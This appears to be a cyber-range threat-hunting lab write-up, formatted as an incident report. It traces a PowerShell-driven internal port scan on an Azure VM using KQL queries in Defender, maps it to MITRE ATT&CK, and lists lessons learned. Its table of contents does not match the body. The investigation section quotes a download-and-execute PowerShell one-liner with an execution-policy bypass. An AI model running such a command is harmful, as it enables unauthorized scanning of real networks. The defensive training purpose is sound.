

# Sudden Network Slowdowns Project 
# Objective:
To investigate abnormal traffic patterns originating from within the network, identify any signs of lateral movement or misuse of built-in tools (e.g., PowerShell), and validate whether an internal host is responsible for the performance degradation.

---
# Tools & Technology:
- Azure Virtual Machine
- PowerShell 
- Microsoft Defender
- KQL Query

---
# Table of contents

- [Step 1) Create a Windows virtual machine in the Azure portal](#step-1-create-a-windows-virtual-machine-in-the-azure-portal)
- [Step 2) Log into the VM and disable the Windows Firewall](#step-2-log-into-the-vm-and-disable-the-windows-firewall)
- [Step 3) Run a PowerShell command:](#step-3-run-a-powershell-command)
- [Step 4) Create a Network Security Group](#step-4-create-a-network-security-group)
- [Step 5) Login to tenable](#step-5-login-to-tenable)
- [Step 6) Run a Basic Scan: Unauthenticated](#step-6-run-a-basic-scan-unauthenticated)
- [Step 7) Run a Basic Scan: Authenticated](#step-7-run-a-basic-scan-authenticated)
- [Difference in Scan Duration](#difference-in-scan-duration)

---


## 🛡️ Incident Report: Internal Port Scanning Activity on 10.0.0.0/16 Network
## 1. Summary
Incident Title: Unauthorized Internal Port Scanning via PowerShell <br />
Date of Discovery: June 10, 2025 <br />
Reporting Team: Security Operations / Threat Hunting <br />
Impacted Network Segment: 10.0.0.0/16 <br />
Affected Host: windows-target-1 (10.0.0.5) <br />
TTPs Observed: T1046, T1059.001, T1078, T1105, T1204.002 <br />
Incident Status: Contained; Rebuilt/ Re-imaging  <br />

## 2. Preparation
### Observation:
The server team reported network performance degradation affecting older devices on the 10.0.0.0/16 internal network.

### Initial Assumption:
After ruling out external threats (e.g., DDoS), internal causes such as large file transfers or port scanning were considered. The environment allows unrestricted internal traffic and the use of scripting tools like PowerShell.

### Hypothesis:
A compromised internal host may be engaging in lateral movement or reconnaissance via port scanning.

## 3. Data Collection
### Data Sources Queried:
DeviceNetworkEvents <br />
DeviceProcessEvents <br />
DeviceFileEvents <br />

### Focus Areas:

Failed network connections (potential scanning) <br />
Suspicious process executions <br />
File downloads or script execution activity <br />

## 4. Data Analysis
### Step 1:
Analyzed DeviceNetworkEvents for failed outbound connection attempts.

```kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize ConnectionCount = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by ConnectionCount

```
![DeviceNetworkEvents](https://github.com/user-attachments/assets/2fdfee8a-937d-4300-97eb-d34024aa24ec)


Result: IP 10.0.0.5 exhibited an unusually high number of failed connections.

### Step 2:
Filtered for all failed connection timestamps for IP 10.0.0.5:

```kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP
| order by FailedConnectionsAttempts desc
```

![DeviceNetworkEvents2](https://github.com/user-attachments/assets/60bc672e-f34a-4e99-aa54-6af5995d8e13)

Finding:
Connections were attempted to multiple ports in sequential order—indicating an automated port scan.

## 5. Investigation

Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:

```kql
let VMName = "windows-target-1";
let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "portscan"
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName

```
![DeviceProcessEvents](https://github.com/user-attachments/assets/42402a97-5812-4ae5-9230-e88689618cbc)


Key Finding:
A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1

```

Account:
Executed by SYSTEM — not expected behavior; not triggered by any admin.

## 6. Response
### Actions Taken:

Logged into the device to verify script existence. <br />
Confirmed the file portscan.ps1 existed under C:\ProgramData. <br />
Isolated the host from the network. <br />
Performed a full malware scan (no malware detected). <br />
Escalated to IT for reimaging of the device to ensure integrity. <br />

## 7. MITRE ATT&CK Mapping

- T1046 - Network Service Discovery  
  (Port scanning activity to identify open services)

- T1059.001 - Command and Scripting Interpreter: PowerShell  
  (Execution of PowerShell script to perform scan)

- T1078 - Valid Accounts  
  (Script executed under SYSTEM account)

- T1105 - Ingress Tool Transfer  
  (Script downloaded from external URL using Invoke-WebRequest)

- T1204.002 - User Execution: Malicious File  
  (Execution of suspicious PowerShell file)

- T1562.001 - Impair Defenses (if applicable)  
  (Not confirmed, but would apply if local defenses were bypassed or modified)
  
## 8. Lessons Learned / Improvement
### Preventive Measures:

Implement internal network segmentation to reduce lateral movement risk. <br />
Restrict PowerShell usage via Group Policy or allow-listing.<br />
Apply egress controls and file reputation filtering for outbound web requests.<br />
Increase visibility over SYSTEM-level activities on endpoints.<br />

### Detection Enhancements:

Create alerts for abnormal outbound connection spikes.<br />
Monitor for suspicious PowerShell usage and external script downloads.<br />
Correlate failed connection logs with script execution patterns.<br />

## 9. Final Status
Threat Contained: ✅

Device Isolated: ✅

Malware Scan Result: Clean

Device Action: Ticket submitted for full rebuild

Follow-up: Review PowerShell execution policies and endpoint monitoring rules


